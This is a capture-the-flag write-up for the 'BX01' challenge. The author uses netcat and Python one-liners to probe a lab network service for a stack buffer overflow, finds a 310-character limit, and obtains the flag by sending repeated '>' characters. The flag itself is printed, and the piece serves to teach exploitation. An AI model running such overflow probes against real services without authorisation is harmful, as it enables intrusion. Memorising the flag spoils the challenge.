# BX01
> 1,000pts

## Briefing
> Access the network service at url: `cfta-bx01.allyourbases.co` and port: `8012` and find a way to get the flag by formatting a valid request.

## Solution
Netcatting in, we're told that there's an exception where angle brackets are not terminated. After providing input, it states that it is terminating due to the exception remaining unresolved.

I first tried to just put an angle bracket in there.
```console
➜ ~ $ nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
>
Error: Exception unresolved. Terminating.
➜ ~ $
```
That didn't help. Maybe it's vulnerable to a buffer overflow?
```console
➜ ~ $ python -c "print('a'*100)" | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
Error: Exception unresolved. Terminating.
➜ ~ $ python -c "print('a'*1000)" | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
*** stack smashing detected ***
➜ ~ $
```
Yes, it is! I ran the payload a few more times to narrow down on the size of the input buffer, and eventually I discovered that you can put in a maximum of `310` characters.
```console
➜ ~ $ python -c "print('a'*311)" | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
*** stack smashing detected ***
➜ ~ $ python -c "print('a'*310)" | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
➜ ~ $
```
Let's try putting lots of `>` in, rather than `a`s.
```console
➜ ~ $ python -c "print('>'*310)" | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
Request successful.

Flag: AlOnGSeaRcHFoROverWriTe
➜ ~ $
```

And we have our flag.

## Flag
Flag: `AlOnGSeaRcHFoROverWriTe`
